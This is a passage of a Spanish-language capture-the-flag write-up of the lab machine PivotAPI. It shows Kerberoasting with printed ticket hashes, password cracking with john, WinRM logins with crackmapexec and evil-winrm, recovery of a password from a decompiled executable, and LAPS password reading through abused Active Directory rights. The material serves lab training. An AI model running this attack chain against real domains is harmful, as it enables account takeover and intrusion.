+$krb5tgs$23$*Dr.Zaiuss$LICORDEBELLOTA.HTB$licordebellota.htb/Dr.Zaiuss*$ed618fb34b6c2dac8dd51af4d22eb800$fc4bac58bb98d6a53eb0c1ac6a0a4691c1c4cc3237117dd5257f78d017a92e517c0ceee8929c1009a851f433a79b67a4c840404554fd29c3548dc263f449e5c7a417e3fe73570f8b801e0fec3e27cc55bd1e110137219f998a7e1fcb85b806a40167feacb2c9ee320f222dc30b4bc27a0b46292b1eadce05881e52b7f3aa8589d6de7a92c13acf861c05dc2d296b09930d2db1087c8d8e7c8f48ed89e3f33b8f69d454041a29a590a616bc91604b5345351b9c78ac4aee7fb8eadcc160ba66c47c109f8f19ac07e684591e7965017cbf72f631e1d44af5eb8972d57c58cbb9d842acb5d9cde99660e43d5ee5b28f3d4e05b17d654b84e3e012d463da54ad5ac92a13700742cf6ebf8c0d72c9229d824c7a833b1d87a32272588eeff95bf51d31ae69b5aee82433e3c41faaf40e2bd69f2f55f8c04eefd1319e988758431562d8e63dd22b20677eaffca3a1f02b646628144f79dc45ddd05e2bc5c96b44807abcf1f86a0939b8d8b21464b645fbd05b2e8af2d47b146eb1760547d49bd24b9cc31ef200613a99b2e58548095f9555f790b1830f1bd17a1cd34ed8ff6c1447d5b64d7445ac16c609364710ee547b3ea7441b97aaed642f4d1dbf6edbccf5268cff68acaf54257101508e3ddc4d3b1ace1a1eb676eef6fc76ac628f964568db44557fcbf8f5add3c47b097654e1ae825c1b7abc54c554dd85054d2fe5dcbc4f134001ac2c6768cfc6a9daf46d7c0df794fcbffa5eefe6d18b5825ffcab621e01bf3dafed68fe589917daf8fd3d91bd09fa80757d8d78b3bc6bc4735d6b649e5886161f2b31f01ff168b01dfd6256946959935714a74d188decf8122d8b4eafdf976fe517ef4cfd66da66bb6c550b9a9644683959a2302028148f8ed4ebda3ae3ebd795977e47dcfda021d72874317ead21dc75adc2ff69b49a3485b666fa4ac98c53cd8235153a9381a6ca3130551c5af813b40bc80b132ff1ab33918dc185a1849bd136a5f1f4c0303654828a6a2fd4de055fb00cd7f5c04aa44985bae72c8f7517a6382a640aed402a853f333a65f8f3a8744b2db92e86f5ebbecf2c28a5f546fe147621a7c02867ab4611e5fded66447fb2dea91a6629ba67227c69013af4846291f4088ebc40f9442f4a238d0a13fc6e1678bff66479ac5b3699d3ded444b580cf78ee31384e0a9817b872ad407944bcb57e864db055a14afb38c85f66f02dbbff95d7e1bcc5909184ab8e407a495f8c46654579ec50941438bb14431684d974c87a5254c9305c995291658e9fb37fba020935cc8b940518e5d65d8c8fc781ec7cc208118acd377eb7dbca3516abae70c429b5a1b72c7c81dfefc5de4d1ec17cfec56c772777127c62fd3e2c3c6b02a1f487ab127cac2ced449502763c216d5b41f36569508bdbb571289cad7f90a6169c97edd7675d1e25a0242737fa50110565e6b206e3951f97a7f697992f4ac0d871cca3e379f4d4947359c97c011b534a1311b41e73f1cfdd66a  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La contraseña no es muy robusta por lo que la crackeamos facilmente usando <code class="language-plaintext highlighter-rouge">john</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">qwe123QWE!@#</span><span class="p">     (</span><span class="am">?</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> las credenciales en winrm y nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec winrm licordebellota.htb -u Dr.Zaiuss -p </span><span class="am">'qwe123QWE!@#'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 5985   PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:PIVOTAPI) (domain:LicorDeBellota.htb)  
+</span><span class="az">HTTP        </span><span class="p">licordebellota.htb 5985   PIVOTAPI         </span><span class="az">[*] </span><span class="p">http://licordebellota.htb:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">licordebellota.htb 5985   PIVOTAPI         </span><span class="ve">[+] </span><span class="p">LicorDeBellota.htb\Dr.Zaiuss:qwe123QWE!@# </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos a traves del proxy con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y conseguimos una powershell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i licordebellota.htb -u Dr.Zaiuss -p </span><span class="am">'qwe123QWE!@#'</span><span class="p">  
+PS C:\Users\Dr.Zaiuss\Documents> </span><span class="am">whoami</span><span class="p">
+licordebellota\dr.zaiuss
+PS C:\Users\Dr.Zaiuss\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-superfume">
+<br><h3 class="post-title">Shell - superfume</h3><br>
+
+<p class="plain-text">En <code class="language-plaintext highlighter-rouge">bloodhound</code> veiamos que Dr.Zaiuss tiene privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el usuario Superfume asi que repetimos el proceso de antes para setearle el <code class="language-plaintext highlighter-rouge">SPN</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Dr.Zaiuss\Documents> </span><span class="am">Import-Module </span><span class="p">.\PowerView.ps1
+PS C:\Users\Dr.Zaiuss\Documents> </span><span class="am">Set-DomainObject </span><span class="c1">-Identity </span><span class="p">superfume </span><span class="c1">-Set</span><span class="p"> @{serviceprincipalname=</span><span class="az">'not/existing'</span><span class="p">}  
+PS C:\Users\Dr.Zaiuss\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">GetUserSPNs</code> esta vez obtenemos tambien el <code class="language-plaintext highlighter-rouge">hash</code> del usuario Superfume, curiosamente la contraseña es exactamente la <code class="language-plaintext highlighter-rouge">misma</code> que la del usuario Dr.Zaiuss</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetUserSPNs </span><span class="p">licordebellota.htb/3v4Si0N:</span><span class="am">'Gu4nCh3C4NaRi0N!23'</span><span class="p"> -request
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name       MemberOf                                         PasswordLastSet             LastLogon                   Delegation 
+--------------------  ---------  -----------------------------------------------  --------------------------  --------------------------  ----------
+not/existing          superfume  CN=Developers,CN=Users,DC=LicorDeBellota,DC=htb  2021-03-05 15:43:51.555648  &ltnever>                                
+not/exist             Dr.Zaiuss  CN=WinRM,CN=Users,DC=LicorDeBellota,DC=htb       2021-03-05 15:42:09.868164  2023-07-08 20:41:24.421217             
+
+$krb5tgs$23$*superfume$LICORDEBELLOTA.HTB$licordebellota.htb/superfume*$5daec5bfab0f9e59f9a8483b4527bb5d$a670fb699180f459506db60e40099c9ba14585246f873216f22951ab6206ace2e6f40a7a193ba943ca0983ccc69ce1cc95e3ea82ba0bc397fd4468b900e61504d97e3f1d890ce7faaca24eedd6588ce69387e0a939ceec49d6af018327dfb31bfef653197546fb03ec2ea2f3bb658b85f54ee74625ce6b6f992ead47d6c23ebe8746de7d807328be9bed33a9db8a1027c64fe8b69a58e7a73031ba9d19a4dae900de76ac88652d1abcbfce1f25e39c128da8e273db2e648d8c0957d4ea74f383ee87919940fcf2d3f6b8b88b5ce8f9769514fd4d6867e50a65f8b52cae3cc869ec4eb257c3bab02af9ffa9df96a3f21bfb1bb989caf37dbde5ef6b79e3579e1eb4b2d36f23ca5b44203b321f556a47b66ce5c7f78ecfb3cc57b7d57565e71008b94e538b1ccc8497e8fb02a7a7ab0a612ed679ef5b5458be5df2a5889f01df1e73f59ca2eb9aefd5165ea9bd56d970a30867aec00114241d747f9b96194a952bf52d0fc85e3b863a52fec709e1fb4475aa8918515070bf734edc02fded0ec335604284a5d2efeba607eeb13d60efb5847cdb4b6cf0923b9fdf18468569c5315b7df8acf5af926203b7175bd6a8c0e155f64a1e571b0e0e9d318bad2aaa826a6ef1d1487a8ba93913f3920397f1c5096c61c99e169d7f7be3b0d9e8b81d440d61f2b30a385eae1a65b7b8ac6fd00a0399002ce47afc1d261a79793d6ff5287b9b06fce033bf426f724c5a4caefa7054087b707f1762f58572f441a84065e2b8362d58ddb33ba7418e7d6796e0d57bb6ebfd3d4cb0502f6c155563b769261b015f775ad0223cbf481b901cb22d60d1d95a53eb67654c88d2690723a981d81702619a63f2dda6c97de1b17ec6a2147d566b504a19b8a6a40bb564166ffa2a0f472bb1bd58e803187f87f28ce50d0889848053abfd9d19ce99f32a92b78e68d8d58bb184b533c1094ec44904993bdc490be300858b591a2eeae7aaa5a1761bd88bc917ea1ced3a312570505f3774ece32cbd36840127c52ccf3bfff29464c0a7c30e5a5fc707990ba0fe03c9cd644aa9f1ad23f4badb309919c49262da0e570f4ddfc1224117e284df89d6c57eea072bc33b15b5d19703178f5d67744e3b818092d46ada38d20be1e00719b82f6a89e2c3abf643d9b1a9a8352244eb293ef69714c64f678fb5752f2eecb0fb3bf2cc443a039839fec7b301a3655945fbb7d71f50ec28f1522041b31827e4cac54917057455ae4b3dccdb0edf37b842ca0c83a22542c318aafc24a56a2c81950e9f78615637f4075ef1dd6a069d8e2832f3a2d89007a3c5f70c3e8a64296b315d4486c2536f617caf4ec9420cf043343bb569cd382c783736f40ea9441384bbd1fe129c116926ac5a6e4bb310b4ca641556b6574300301afb2b444c8472e13223b33c0a3ef5ffbb3d44cad05cb3569bae94099c44a7d6280eb97a4392669ad986f2a6138cbb834c0ad471a1331824d74e6cf6b51f7b97cf9f7223faf0b8e888  
+$krb5tgs$23$*Dr.Zaiuss$LICORDEBELLOTA.HTB$licordebellota.htb/Dr.Zaiuss*$ed618fb34b6c2dac8dd51af4d22eb800$fc4bac58bb98d6a53eb0c1ac6a0a4691c1c4cc3237117dd5257f78d017a92e517c0ceee8929c1009a851f433a79b67a4c840404554fd29c3548dc263f449e5c7a417e3fe73570f8b801e0fec3e27cc55bd1e110137219f998a7e1fcb85b806a40167feacb2c9ee320f222dc30b4bc27a0b46292b1eadce05881e52b7f3aa8589d6de7a92c13acf861c05dc2d296b09930d2db1087c8d8e7c8f48ed89e3f33b8f69d454041a29a590a616bc91604b5345351b9c78ac4aee7fb8eadcc160ba66c47c109f8f19ac07e684591e7965017cbf72f631e1d44af5eb8972d57c58cbb9d842acb5d9cde99660e43d5ee5b28f3d4e05b17d654b84e3e012d463da54ad5ac92a13700742cf6ebf8c0d72c9229d824c7a833b1d87a32272588eeff95bf51d31ae69b5aee82433e3c41faaf40e2bd69f2f55f8c04eefd1319e988758431562d8e63dd22b20677eaffca3a1f02b646628144f79dc45ddd05e2bc5c96b44807abcf1f86a0939b8d8b21464b645fbd05b2e8af2d47b146eb1760547d49bd24b9cc31ef200613a99b2e58548095f9555f790b1830f1bd17a1cd34ed8ff6c1447d5b64d7445ac16c609364710ee547b3ea7441b97aaed642f4d1dbf6edbccf5268cff68acaf54257101508e3ddc4d3b1ace1a1eb676eef6fc76ac628f964568db44557fcbf8f5add3c47b097654e1ae825c1b7abc54c554dd85054d2fe5dcbc4f134001ac2c6768cfc6a9daf46d7c0df794fcbffa5eefe6d18b5825ffcab621e01bf3dafed68fe589917daf8fd3d91bd09fa80757d8d78b3bc6bc4735d6b649e5886161f2b31f01ff168b01dfd6256946959935714a74d188decf8122d8b4eafdf976fe517ef4cfd66da66bb6c550b9a9644683959a2302028148f8ed4ebda3ae3ebd795977e47dcfda021d72874317ead21dc75adc2ff69b49a3485b666fa4ac98c53cd8235153a9381a6ca3130551c5af813b40bc80b132ff1ab33918dc185a1849bd136a5f1f4c0303654828a6a2fd4de055fb00cd7f5c04aa44985bae72c8f7517a6382a640aed402a853f333a65f8f3a8744b2db92e86f5ebbecf2c28a5f546fe147621a7c02867ab4611e5fded66447fb2dea91a6629ba67227c69013af4846291f4088ebc40f9442f4a238d0a13fc6e1678bff66479ac5b3699d3ded444b580cf78ee31384e0a9817b872ad407944bcb57e864db055a14afb38c85f66f02dbbff95d7e1bcc5909184ab8e407a495f8c46654579ec50941438bb14431684d974c87a5254c9305c995291658e9fb37fba020935cc8b940518e5d65d8c8fc781ec7cc208118acd377eb7dbca3516abae70c429b5a1b72c7c81dfefc5de4d1ec17cfec56c772777127c62fd3e2c3c6b02a1f487ab127cac2ced449502763c216d5b41f36569508bdbb571289cad7f90a6169c97edd7675d1e25a0242737fa50110565e6b206e3951f97a7f697992f4ac0d871cca3e379f4d4947359c97c011b534a1311b41e73f1cfdd66a  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">qwe123QWE!@#</span><span class="p">     (</span><span class="am">?</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuevamente comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code>, asi que podemos conectarnos usando <code class="language-plaintext highlighter-rouge">evil-winrm</code> como el usuario <code class="language-plaintext highlighter-rouge">Superfume</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec winrm licordebellota.htb -u superfume -p </span><span class="am">'qwe123QWE!@#'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 5985   PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:PIVOTAPI) (domain:LicorDeBellota.htb)  
+</span><span class="az">HTTP        </span><span class="p">licordebellota.htb 5985   PIVOTAPI         </span><span class="az">[*] </span><span class="p">http://licordebellota.htb:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">licordebellota.htb 5985   PIVOTAPI         </span><span class="ve">[+] </span><span class="p">LicorDeBellota.htb\superfume:qwe123QWE!@# </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i licordebellota.htb -u superfume -p </span><span class="am">'qwe123QWE!@#'</span><span class="p">  
+PS C:\Users\superfume\Documents> </span><span class="am">whoami</span><span class="p">
+licordebellota\superfume
+PS C:\Users\superfume\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-jari">
+<br><h3 class="post-title">Shell - jari</h3><br>
+
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">C:\</code> nos encontramos con un directorio <code class="language-plaintext highlighter-rouge">Developers</code> donde dentro hay otros directorios con los nombres de los usuarios <code class="language-plaintext highlighter-rouge">Jari</code> y <code class="language-plaintext highlighter-rouge">Superfume</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\> </span><span class="am">dir</span><span class="p">
+
+    Directorio: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         8/8/2020   7:23 PM                Developers
+d-----         8/8/2020  12:53 PM                inetpub
+d-----         8/8/2020  10:48 PM                PerfLogs
+d-r---        2/19/2021   1:42 PM                Program Files
+d-----         8/9/2020   5:06 PM                Program Files (x86)  
+d-r---         8/8/2020   7:46 PM                Users
+d-----        4/29/2021   5:31 PM                Windows
+
+PS C:\> </span><span class="am">cd </span><span class="p">Developers
+PS C:\Developers> </span><span class="am">dir</span><span class="p">
+
+    Directorio: C:\Developers
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         8/8/2020   7:26 PM                Jari
+d-----         8/8/2020   7:23 PM                Superfume
+
+PS C:\Developers></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dentro de <code class="language-plaintext highlighter-rouge">Superfume</code> no encontramos nada interesante pero en <code class="language-plaintext highlighter-rouge">Jari</code> existen 2 archivos, el primero es un programa en <code class="language-plaintext highlighter-rouge">C#</code> y un compilado con extension <code class="language-plaintext highlighter-rouge">exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Developers> </span><span class="am">cd </span><span class="p">Jari
+PS C:\Developers\Jari> </span><span class="am">dir</span><span class="p">
+
+    Directorio: C:\Developers\Jari
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         8/8/2020   7:26 PM           3676 program.cs
+-a----         8/8/2020   7:18 PM           7168 restart-mssql.exe
+
+PS C:\Developers\Jari> </span><span class="am">download </span><span class="p">program.cs program.cs
+</span><span class="az">
+Info: Downloading C:\Developers\Jari\program.cs to program.cs
+
+Info: Download successful!
+</span><span class="p">
+PS C:\Developers\Jari> </span><span class="am">download </span><span class="p">restart-mssql.exe restart-mssql.exe
+</span><span class="az">
+Info: Downloading C:\Developers\Jari\restart-mssql.exe to restart-mssql.exe  
+
+Info: Download successful!
+</span><span class="p">
+PS C:\Developers\Jari></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el <code class="language-plaintext highlighter-rouge">program.cs</code> la parte que nos podria interesar que es password es igual a nada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">string </span><span class="p">password </span><span class="o">= </span><span class="s">""</span><span class="p">;
+</span><span class="o">for</span><span class="p"> (</span><span class="no">int </span><span class="p">x </span><span class="o">= </span><span class="mi">0</span><span class="p">; x </span><span class="o">< </span><span class="p">password.Length; x</span><span class="o">++</span><span class="p">)  
+{
+   ssPwd.AppendChar(password[x]);
+}
+password </span><span class="o">= </span><span class="s">""</span><span class="p">;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Analizando un poco el codigo decompilado del exe por <code class="language-plaintext highlighter-rouge">dnspy</code> podemos ver que define las variables <code class="language-plaintext highlighter-rouge">bytes</code> y <code class="language-plaintext highlighter-rouge">data</code>, despues le pasa estas variables como argumento a <code class="language-plaintext highlighter-rouge">Decrypt</code> almacenandolo en <code class="language-plaintext highlighter-rouge">array</code>, podemos hacer un <code class="language-plaintext highlighter-rouge">breakpoint</code> justo despues para ver los valores, corremos el programa y vemos los valores de <code class="language-plaintext highlighter-rouge">array</code></p>
+<a href="/htb/pivotapi/13.png" target="_blank"><div><p><img src="/htb/pivotapi/13.png"></p></div></a>
+
+<p class="plain-text">Una forma facil de ver la contraseña es en la <code class="language-plaintext highlighter-rouge">memoria</code> ver su representación tanto en hexadecimal como en <code class="language-plaintext highlighter-rouge">ascii</code>, a la derecha nos encontramos con ella en texto claro</p>
+<a href="/htb/pivotapi/14.png" target="_blank"><div><p><img src="/htb/pivotapi/14.png"></p></div></a>
+
+<p class="plain-text">O con <code class="language-plaintext highlighter-rouge">python3</code> declarar el valor de array y con <code class="language-plaintext highlighter-rouge">chr</code> convertirlo a ascii y asi verla</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> -q
+>>> array </span><span class="o">= </span><span class="p">[</span><span class="mi">67</span><span class="p">, </span><span class="mi">111</span><span class="p">, </span><span class="mi">115</span><span class="p">, </span><span class="mi">64</span><span class="p">, </span><span class="mi">67</span><span class="p">, </span><span class="mi">104</span><span class="p">, </span><span class="mi">117</span><span class="p">, </span><span class="mi">110</span><span class="p">, </span><span class="mi">103</span><span class="p">, </span><span class="mi">64</span><span class="p">, </span><span class="mi">33</span><span class="p">, </span><span class="mi">82</span><span class="p">, </span><span class="mi">80</span><span class="p">, </span><span class="mi">71</span><span class="p">]  
+>>> value </span><span class="o">=</span><span class="s"> ""</span><span class="p">
+>>> </span><span class="o">for </span><span class="p">num </span><span class="o">in </span><span class="p">array:
+...     value </span><span class="o">+= </span><span class="no">chr</span><span class="p">(num)
+...
+>>> </span><span class="no">print</span><span class="p">(value)
+Cos@Chung@!RPG
+>>></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El nombre del directorio era <code class="language-plaintext highlighter-rouge">Jari</code> asi que con <code class="language-plaintext highlighter-rouge">crackmapexec</code> comprobamos esa contraseña hacia <code class="language-plaintext highlighter-rouge">winrm</code> y nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code> que nos dice que son validas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec winrm licordebellota.htb -u Jari -p </span><span class="am">'Cos@Chung@!RPG'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 5985   PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:PIVOTAPI) (domain:LicorDeBellota.htb)  
+</span><span class="az">HTTP        </span><span class="p">licordebellota.htb 5985   PIVOTAPI         </span><span class="az">[*] </span><span class="p">http://licordebellota.htb:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">licordebellota.htb 5985   PIVOTAPI         </span><span class="ve">[+] </span><span class="p">LicorDeBellota.htb\Jari:Cos@Chung@!RPG </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos usando <code class="language-plaintext highlighter-rouge">evil-winrm</code> y ganamos una powershell como el usuario Jari</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i licordebellota.htb -u Jari -p </span><span class="am">'Cos@Chung@!RPG'</span><span class="p">  
+PS C:\Users\jari\Documents> </span><span class="am">whoami</span><span class="p">
+licordebellota\jari
+PS C:\Users\jari\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Volviendo a <code class="language-plaintext highlighter-rouge">bloodhound</code> a buscar posibles rutas esta vez partiendo de <code class="language-plaintext highlighter-rouge">Jari</code>, encontramos que este tiene privilegios <code class="language-plaintext highlighter-rouge">ForceChangePassword</code> sobre <code class="language-plaintext highlighter-rouge">Gibdeon</code> que es parte del grupo <code class="language-plaintext highlighter-rouge">Account Operators</code> que tiene privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el grupo <code class="language-plaintext highlighter-rouge">Laps Read</code> grupo que tiene <code class="language-plaintext highlighter-rouge">ReadLapsPassword</code> sobre el equipo <code class="language-plaintext highlighter-rouge">PIVOTAPI</code></p>
+<a href="/htb/pivotapi/22.png" target="_blank"><div><p><img src="/htb/pivotapi/22.png"></p></div></a>
+
+<p class="plain-text">Iniciemos aprovechando el privilegio para cambiar la <code class="language-plaintext highlighter-rouge">contraseña</code> al usuario <code class="language-plaintext highlighter-rouge">gibdeon</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ net </span><span class="p">rpc password gibdeon password123# -U </span><span class="am">'licordebellota.htb/Jari%Cos@Chung@!RPG'</span><span class="p"> -S pivotapi.licordebellota.htb  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora que tenemos privilegio <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el grupo <code class="language-plaintext highlighter-rouge">Laps Read</code> definimos las credenciales del usuario <code class="language-plaintext highlighter-rouge">Gibdeon</code> y agregamos al usuario <code class="language-plaintext highlighter-rouge">Jari</code> al grupo <code class="language-plaintext highlighter-rouge">Laps Read</code></a>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\jari\Documents> </span><span class="am">Import-Module </span><span class="p">.\PowerView.ps1
+PS C:\Users\jari\Documents> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'password123#' </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Users\jari\Documents> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'licordebellota.htb\gibdeon'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)  
+PS C:\Users\jari\Documents> </span><span class="am">Add-DomainGroupMember </span><span class="c1">-Identity </span><span class="am">'Laps Read' </span><span class="c1">-Members </span><span class="az">'Jari' </span><span class="c1">-Credential </span><span class="ve">$Cred</span><span class="p">
+PS C:\Users\jari\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si ahora revisamos los <code class="language-plaintext highlighter-rouge">grupos</code> a los que pertenece <code class="language-plaintext highlighter-rouge">Jari</code> podemos ver Laps Read</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\jari\Documents> </span><span class="am">Get-ADPrincipalGroupMembership </span><span class="p">Jari | </span><span class="am">Select </span><span class="p">Name  
+
+Name
+----
+Usuarios del dominio
+Usuarios de administración remota
+LAPS READ
+WinRM
+Developers
+
+PS C:\Users\jari\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente podemos leer la propiedad <code class="language-plaintext highlighter-rouge">ms-mcs-AdmPwd</code> del dominio y el output que esto nos muestra la contraseña del usuario <code class="language-plaintext highlighter-rouge">Administrador</code> en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\jari\Documents> </span><span class="am">Get-DomainObject </span><span class="p">PIVOTAPI </span><span class="c1">-Properties </span><span class="az">'ms-mcs-AdmPwd'</span><span class="p">  
+
+ms-mcs-admpwd
+-------------
+q81I17beCaYbjW7n5rLe
+
+PS C:\Users\jari\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> comprobamos la contraseña con Administrator, devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb licordebellota.htb -u Administrador -p q81I17beCaYbjW7n5rLe
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ve">[+] </span><span class="p">LicorDeBellota.htb\Administrador:q81I17beCaYbjW7n5rLe </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> para obtener una powershell, ahora buscando la <code class="language-plaintext highlighter-rouge">flag</code> final la podemos ver en el escritorio del usuario <code class="language-plaintext highlighter-rouge">cybervaca</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i licordebellota.htb -u Administrador -p q81I17beCaYbjW7n5rLe  
+PS C:\Users\Administrador\Documents> </span><span class="am">whoami</span><span class="p">
+licordebellota\administrador
+PS C:\Users\Administrador\Documents> </span><span class="am">dir </span><span class="p">C:\Users </span><span class="c1">-recurse </span><span class="p">root.txt
+
+    Directorio: C:\Users\cybervaca\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         7/8/2023  11:19 PM             34 root.txt
+
+PS C:\Users\Administrador\Documents> </span><span class="am">dir </span><span class="p">C:\Users </span><span class="c1">-recurse </span><span class="p">root.txt | </span><span class="am">type</span><span class="p">  
+d9a**************************ad7
+PS C:\Users\Administrador\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="altern1-administrator">
+<br><h3 class="post-title">Alternativa 1 - Administrator</h3><br>
+
+<p class="plain-text">Al usar <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> en mssql ejecutabamos comandos como cuenta de <code class="language-plaintext highlighter-rouge">servicio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">licordebellota.htb/sa:</span><span class="am">'#mssql_s3rV1c3!2020'</span><span class="p">@pivotapi.licordebellota.htb  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
